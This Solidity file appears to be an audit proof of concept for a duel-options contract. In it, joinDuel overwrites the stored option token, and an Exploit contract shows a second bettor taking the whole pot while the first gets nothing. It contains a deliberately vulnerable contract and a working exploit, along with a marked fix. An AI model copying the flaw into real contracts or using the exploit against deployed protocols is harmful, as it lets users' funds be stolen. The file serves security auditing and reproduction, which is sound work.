// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Filament duel options — Zokyo, 2024-11-21
    joinDuel deploys a fresh OptionToken for an option index that already has
    one and overwrites optionIndexToOptionToken. Payout uses only the latest
    token. Alice wagered 1000 USDC on the winning option and her share is 0.
    Bob, who joined second, receives the whole 2000 USDC pot (net +1000).

    Verbatim: the mapping write, and _getUserDuelOptionShare's balance/supply split.
*/

contract USDC {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IERC20View {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract OptionToken {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract Duel {
    USDC public usdc;
    uint256 public pot;
    uint256 public lastShareA;
    uint256 public lastShareB;
    mapping(string => mapping(uint256 => address)) public optionIndexToOptionToken;

    constructor(USDC _usdc) {
        usdc = _usdc;
    }

    function joinDuel(string memory _duelId, uint256 _optionsIndex, string memory _option, uint256 amount) external {
        OptionToken newOptionToken = new OptionToken(_option, _option); // @> VULN: a second join deploys a new option token; the next store overwrites the old one
        optionIndexToOptionToken[_duelId][_optionsIndex] = address(newOptionToken);
        // FIX: if a token is already stored for this index, mint that token instead
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay");
        newOptionToken.mint(msg.sender, amount);
        pot += amount;
    }

    /// @notice Recommended fix. Not used by run().
    function joinDuelFixed(string memory _duelId, uint256 _optionsIndex, uint256 amount) external {
        address existing = optionIndexToOptionToken[_duelId][_optionsIndex];
        require(existing != address(0), "no token");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay");
        OptionToken(existing).mint(msg.sender, amount);
        pot += amount;
    }

    function _getUserDuelOptionShare(string memory _duelId, uint256 _optionIndex, address _user)
        internal
        view
        returns (uint256 optionShare)
    {
        address optionToken = optionIndexToOptionToken[_duelId][_optionIndex];
        uint256 optionTokenBalance = IERC20View(optionToken).balanceOf(_user);
        uint256 totalOptionTokenSupply = IERC20View(optionToken).totalSupply();
        optionShare = (optionTokenBalance * 1e18) / totalOptionTokenSupply;
    }

    function distribute(address userA, address userB) external {
        uint256 shareA = _getUserDuelOptionShare("1", 0, userA);
        uint256 shareB = _getUserDuelOptionShare("1", 0, userB);
        lastShareA = shareA;
        lastShareB = shareB;
        uint256 payA = pot * shareA / 1e18;
        uint256 payB = pot * shareB / 1e18;
        pot = 0;
        if (payA > 0) require(usdc.transfer(userA, payA), "payA");
        if (payB > 0) require(usdc.transfer(userB, payB), "payB");
    }
}

contract Bettor {
    USDC public usdc;
    Duel public duel;

    constructor(USDC _usdc, Duel _duel) {
        usdc = _usdc;
        duel = _duel;
    }

    function approve() external {
        usdc.approve(address(duel), type(uint256).max);
    }

    function join(uint256 amount) external {
        duel.joinDuel("1", 0, "YES", amount);
    }

    function joinFixed(uint256 amount) external {
        duel.joinDuelFixed("1", 0, amount);
    }
}

contract Exploit {
    USDC public usdc; // CREATE nonce 1
    Duel public duel; // CREATE nonce 2 — vulnerable
    Bettor public alice; // CREATE nonce 3

    constructor() {
        usdc = new USDC();
        duel = new Duel(usdc);
        alice = new Bettor(usdc, duel);
        usdc.mint(address(alice), 1000 ether);
        usdc.mint(address(this), 1000 ether);
        alice.approve();
        usdc.approve(address(duel), type(uint256).max);
        // Alice is first on duel 1 / option 0. Her token is the one that should pay.
        alice.join(1000 ether);
    }

    function run() external {
        // Bob joins the same option. The mapping now points at Bob's token only.
        duel.joinDuel("1", 0, "YES", 1000 ether);
        duel.distribute(address(alice), address(this));
        require(duel.lastShareA() == 0, "alice share is 0");
        require(duel.lastShareB() == 1e18, "bob share is 100%");
        require(usdc.balanceOf(address(alice)) == 0, "alice was not paid");
        require(usdc.balanceOf(address(this)) == 2000 ether, "bob took the pot");
    }
}
